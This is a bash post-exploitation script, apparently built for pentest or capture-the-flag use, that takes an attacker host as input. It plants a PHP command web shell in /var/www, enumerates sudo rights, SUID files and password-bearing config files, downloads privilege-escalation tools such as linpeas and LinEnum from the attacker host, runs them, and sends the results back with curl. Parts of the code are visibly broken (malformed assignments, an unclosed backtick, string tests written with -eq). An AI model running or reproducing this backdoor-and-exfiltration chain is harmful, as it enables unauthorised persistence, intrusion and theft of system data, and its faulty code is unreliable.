#!/usr/bin/bash

usage() 
{ 
		echo "USAGE:"
		echo "-i	Attacker IP/Host"
		echo "-u	Local User to Check"
		echo "-d 	Specify Path To Local wget/curl downloader"	
}

setdload()
{
command -v curl >/dev/null 2>&1
if [ $? -eq 0 ]; then
	echo -e "\n[*] Curl Found. Continuing.\n"
	dload="curl"
else
	command -v wget >/dev/null 2>&1
	if [ $? -eq 0 ]; then
		echo -e "\n[*] OK. wget found. Continuingd.\n"
		dload="wget"
	else
		echo -e "\n [!] Neither curl nor wget found. Skipping downloads\n"
		echo -e "\n [!] Specify with '-n' \n"
		dload="null"
	fi
fi
}	

prep()
{
	# Check first argument is supplied. Should be hostname/IP address
	if [ -z "$ip" ] ; then
		echo "Host Required. Exiting."
		exit
	fi
	
	# Check /dev/shm is available for storing and running scripts
	# Else use /tmp
	if [ -d "/dev/shm" ]; then
		var dir="/dev/shm"
	else
		var dir="/tmp"
	fi
	
	mkdir $dir/recon
	cd $dir/recon
	
	# curl or wget?
	if [ -z "$dload" ] ; then
		setdload
	fi
	
	# python2 or 3?
	#command -v foo >/dev/null 2>&1 || { echo -e "I require foo but it's not installed.  Aborting." >&2; exit 1; }
	#https://www.cyberciti.biz/faq/unix-linux-shell-find-out-posixcommand-exists-or-not/
}

# Install PHP backdoor in web root
persist()
{
	echo -e "#### Backdoor Install Attempt ####\n"
	echo -e "<?php passthru($_GET['cmd']); ?>" > /var/www/`find /var/www -perm -o+w` 1>/shell.php
	if [ $? -eq 0 ]; then
		echo -e "\n[*] OK. Backdoor Installed.\n"
	else
		echo -e "\n [!] Failed. Check Permissions\n"
		ls -la /var/www
	fi
}

# Run quick enum commands
quick_enum()
{
	echo -e "\n#### Sudoers ####\n"
	sudo -l
	
	echo -e "\n#### Kernel ####\n"
	uname -a
	
	echo -e "\n#### SUID Files ####\n"
	find / -type f -perm -4000 2>/dev/null
	
	echo -e "\n#### Passwords in /opt?? ####\n"
	grep -iRl password /opt/*
	
	echo -e "\n#### Check /opt ####\n"
	ls -la /opt
	
	echo -e "\n#### Any wp-config.php files? ####\n"
	find / -name wp-config.php 2>/dev/null
	
	if [ "$user" ] ; then
		echo -e "\n#### Files Owned by User: $user ####\n"
		find / -user $2 2>/dev/null
	fi
	
	# Path and permissions
	pathinfo=`echo $PATH 2>/dev/null
	if [ "$pathinfo" ]; then
		pathswriteable=ls -ld `echo $PATH | tr ":" " "`
		echo -e "\n### Path information ###\n" 
		echo -e $pathinfo
		echo -e "\n"
		echo -e "$pathswriteable"
		echo -e "\n"
	fi
	
	echo -e "\n#### Processes ####\n"
	ps aux
}

# Download enumeration scripts and binaries
download()
{
	if [ $dload -eq "wget" ] ; then
		echo -e "\n#### Downloading LinEnum.sh ####\n"
		$dload $1/LinEnum.sh
	
		echo -e "\n#### Downloading psspy32 ####\n"
		$dload $1/psspy32
	
		echo -e "\n#### Downloading linux-priv-checker ####\n"
		$dload $1/linuxprivchecker.py
	
		echo -e "\n#### Downloading linpeas.sh ####\n"
		$dload $1/linpeas.sh
	
		echo -e "\n#### Downloading lse.sh ####\n"
		$dload $1/lse.sh
		
		echo -e "\n#### Downloading linux-exploit-suggester.sh ####\n"
		$dload $1/linux-exploit-suggester.sh
	fi
}

# Execute enum scripts
execute()
{
	scripts=("LinEnum.sh" "linpeas.sh" "lse.sh" "linux-exploit-suggester.sh")
	
	for script in "${scripts[@]}"
	do
		echo -e "\n#### Run $script ####\n"
		bash $script > $script.txt
	done
	
	echo -e "\n#### Run linuxprivchecker.py ####\n"
	python linuxprivchecker.py > linuxprivchecker.py.txt
	
}

# Exfiltrate enum script results
exfiltrate()
{
	if [ $dload -eq "curl" ] || [  $dload != "wget" ] || [  $dload != "null" ]; then
		files=("LinEnum.sh.txt" "linpeas.sh.txt" "lse.sh.txt" "linuxprivchecker.py.txt")
	
		for file in "${files[@]}"
		do
			echo -e "\n#### Exfiltrating: $file ####\n" 
			$dload -F "data=@$file" $1:443
		done
	else
		echo -e "\n### Command not specified. Exfiltrate manually ###\n"
	fi
}

run()
{
	prep
	persist
	quick_enum
	download
	execute
	exfiltrate
}

# Get user arguments
while getopts "h:i:u:d" option; do
 case "${option}" in
    i) ip=${OPTARG};;
    u) user=${OPTARG};;
    d) dload=${OPTARG};;
    h) usage; exit;;
    *) usage; exit;;
 esac
done

run
